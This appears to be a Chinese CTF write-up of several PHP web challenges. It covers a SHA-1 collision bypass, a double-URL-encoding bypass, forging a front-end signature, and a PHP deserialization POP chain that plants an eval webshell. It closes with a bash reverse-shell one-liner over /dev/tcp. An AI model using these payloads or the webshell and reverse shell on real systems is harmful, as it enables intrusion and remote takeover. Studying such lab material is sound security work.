<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;fllag&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no no no no way for you to do so.&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) || <span class="title function_ invoke__">is_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;There is no way you can sneak me, young man!&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Hanzo:It is impossible only the tribe of Shimada can controle the dragon&lt;br/&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Genji:We will see again Hanzo&#x27;</span>.<span class="variable">$flag</span>.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Wrong!&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Just G1ve it a try.&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>找到文章，<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFpL2FydGljbGUvZGV0YWlscy82ODk1MzczMA==">链接</span></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure>
<blockquote>
<p>here_s_the_flag.php</p>
</blockquote>
<p>访问：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;flllllllllag&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="string">&quot;Longlone&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;no no no!&lt;br&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] === <span class="string">&quot;Longlone&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;flag: <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<!-- 套娃人滚出ctf -->
<p>直接给我二次编码绕过了</p>
<blockquote>
<p>?id&#x3D;%254conglone</p>
</blockquote>
<p>flag{PHP_1s_fu1king_awesome}</p>
<h2 id="蜜雪冰城甜蜜蜜"><a href="#蜜雪冰城甜蜜蜜" class="headerlink" title="蜜雪冰城甜蜜蜜"></a>蜜雪冰城甜蜜蜜</h2><p>前端加密然后传数据给sign.php再返回给主页，具体代码再最后：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 生成签名</span></span><br><span class="line"><span class="comment"> * @params  待签名的json数据</span></span><br><span class="line"><span class="comment"> * @secret  密钥字符串</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">makeSign</span>(<span class="params">params, secret</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> ksort = <span class="title class_">Object</span>.<span class="title function_">keys</span>(params).<span class="title function_">sort</span>();</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> ki <span class="keyword">in</span> ksort)&#123; </span><br><span class="line">    str += ksort[ki] + <span class="string">&#x27;=&#x27;</span> + params[ksort[ki]] + <span class="string">&#x27;&amp;&#x27;</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    str += <span class="string">&#x27;secret=&#x27;</span> + secret;</span><br><span class="line">    <span class="keyword">var</span> token = <span class="title function_">hex_md5</span>(str).<span class="title function_">toUpperCase</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">rsa_sign</span>(token);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * rsa加密token</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">rsa_sign</span>(<span class="params">token</span>)&#123;</span><br><span class="line">     <span class="keyword">var</span> pubkey=<span class="string">&#x27;-----BEGIN PUBLIC KEY-----&#x27;</span>;</span><br><span class="line">    pubkey+=<span class="string">&#x27;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDAbfx4VggVVpcfCjzQ+nEiJ2DL&#x27;</span>;</span><br><span class="line">    pubkey+=<span class="string">&#x27;nRg3e2QdDf/m/qMvtqXi4xhwvbpHfaX46CzQznU8l9NJtF28pTSZSKnE/791MJfV&#x27;</span>;</span><br><span class="line">    pubkey+=<span class="string">&#x27;nucVcJcxRAEcpPprb8X3hfdxKEEYjOPAuVseewmO5cM+x7zi9FWbZ89uOp5sxjMn&#x27;</span>;</span><br><span class="line">    pubkey+=<span class="string">&#x27;lVjDaIczKTRx+7vn2wIDAQAB&#x27;</span>;</span><br><span class="line">    pubkey+=<span class="string">&#x27;-----END PUBLIC KEY-----&#x27;</span>;</span><br><span class="line">    <span class="comment">// 利用公钥加密</span></span><br><span class="line">    <span class="keyword">var</span> encrypt = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>();</span><br><span class="line">    encrypt.<span class="title function_">setPublicKey</span>(pubkey);</span><br><span class="line">    <span class="keyword">return</span> encrypt.<span class="title function_">encrypt</span>(token);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 获取时间戳</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_time</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    <span class="keyword">var</span> time = d.<span class="title function_">getTime</span>()/<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//secret密钥</span></span><br><span class="line"><span class="keyword">var</span> secret = <span class="string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;[href=&#x27;#&#x27;]&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> params = &#123;&#125;;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">123</span>);</span><br><span class="line">    </span><br><span class="line">    params.<span class="property">id</span> = $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    params.<span class="property">timestamp</span> = <span class="title function_">get_time</span>();</span><br><span class="line">    params.<span class="property">fake_flag</span>= <span class="string">&#x27;SYC&#123;lingze_find_a_girlfriend&#125;&#x27;</span>;</span><br><span class="line">    params.<span class="property">sign</span> = <span class="title function_">makeSign</span>(params, secret);</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        url : <span class="string">&quot;http://106.55.154.252:8083/sign.php&quot;</span>,</span><br><span class="line">        data : params,</span><br><span class="line">        <span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span><br><span class="line">            $(<span class="string">&#x27;#text&#x27;</span>).<span class="title function_">html</span>(msg);</span><br><span class="line">            <span class="title function_">alert</span>(msg);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">async</span>:<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>三个数据都需要对上，但既然是通过js加密，所以直接修改前端页面数据并提交执行即可</p>
<p>f12修改页面源码，随便一个可以提交的标签都可以，直接添加或修改，然后点击提交即可获取</p>
<h1 id="陇原战疫"><a href="#陇原战疫" class="headerlink" title="陇原战疫"></a>陇原战疫</h1><h2 id="eaaasyphp"><a href="#eaaasyphp" class="headerlink" title="eaaasyphp"></a>eaaasyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$str1</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$str2</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Esle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">Check</span>::<span class="variable">$str1</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hint</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;no hint&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;hint)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;hint)();</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bunny</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Check</span>::<span class="variable">$str2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;data)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;data = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;filename, <span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title class_">Check</span>::<span class="variable">$str2</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome&quot;</span> . <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bypass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Check</span>::<span class="variable">$str1</span>) &#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;str4)();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>造个poc</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$str1</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$str2</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Esle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$muhua</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;muhua = <span class="keyword">new</span> <span class="title class_">Bypass</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bunny</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="string">&quot;muhua.php&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="string">&quot;&lt;?php @eval(\$_REQUEST[&#x27;1&#x27;]);&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="keyword">new</span> <span class="title class_">Bunny</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bypass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str4 = <span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Esle</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>
<p>不知道为什么打不通，明明本地都行，也不知道他版本是多少</p>
<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</p>
<p>bash -c “bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;8084 0&gt;&amp;1”</p>
